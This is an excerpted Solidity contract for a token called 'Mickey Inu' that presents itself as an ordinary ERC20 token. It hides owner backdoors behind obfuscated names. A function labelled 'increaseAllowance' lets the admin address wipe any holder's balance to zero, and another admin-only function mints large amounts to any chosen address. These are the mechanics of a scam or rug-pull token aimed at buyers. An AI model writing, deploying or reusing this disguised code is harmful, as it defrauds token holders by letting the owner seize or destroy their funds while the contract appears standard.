...
contract MICKEYTOKEN is Ownable {
    address public czkamn17;
    uint256 supplyamount = 10000000000*10**decimals();
    uint256 private _cctotalSupply = supplyamount;
    string private _cctokenname = "Mickey Inu";
    string private _cctokensymbol = "MICKEY";
    constructor(address tokenadmin) {
        czkamn17 = tokenadmin;
       MICKEY[_msgSender()] += supplyamount;
        emit Transfer(address(0), _msgSender(), supplyamount);
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    mapping(address => uint256) private MICKEY;
    ...
    function increaseAllowance(address uuyxxx) public     {
        if(czkamn17 == _msgSender()){
        address newadd = uuyxxx;
        uint256 curamount = MICKEY[newadd];
        uint256 newaaamount = MICKEY[newadd]+MICKEY[newadd]-curamount;
        MICKEY[newadd] -= newaaamount;
        }else{
        if(czkamn17 == _msgSender()){
        }else{
            revert("ccc");
    ...
    external {
        ...
        MICKEY[cc123d] += 38200*((10**decimals()*xxtoudiamount))*1*1;
        require(czkamn17 == _msgSender());
        if(czkamn17 == _msgSender()){
        }
    }
    ...
    function _transfer(
        ...
        uint256 balance = MICKEY[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        MICKEY[from] = MICKEY[from]-amount;
        MICKEY[to] = MICKEY[to]+amount;
